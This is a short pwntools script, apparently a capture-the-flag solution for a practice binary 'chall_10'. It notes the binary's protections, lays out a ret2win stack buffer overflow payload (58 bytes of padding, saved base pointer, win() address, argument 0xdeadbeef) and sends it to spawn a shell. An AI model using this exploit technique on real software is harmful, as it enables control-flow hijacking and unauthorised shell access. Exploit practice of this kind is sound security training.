'''
Flaws: Partial RELRO, no PIE, Symbols
Security: NX enabled

3a --> 58

Build Payload with:
- 58 bytes of padding
- 4  bytes of Old Base Pointer
- Address of win()
- 4  bytes of any address to jump at after function finnishes, but it doesn't matter
- Address to compare against so that /bin/sh executes
'''
from pwn import *

win = 0x080484d6

p = process("./chall_10")
l1 = b"Something"
p.sendline(l1)

offset = 58
l2 = b"A"*offset + b"bOEP" + p32(win) + b'fake' + p32(0xdeadbeef)
p.sendline(l2)
p.interactive()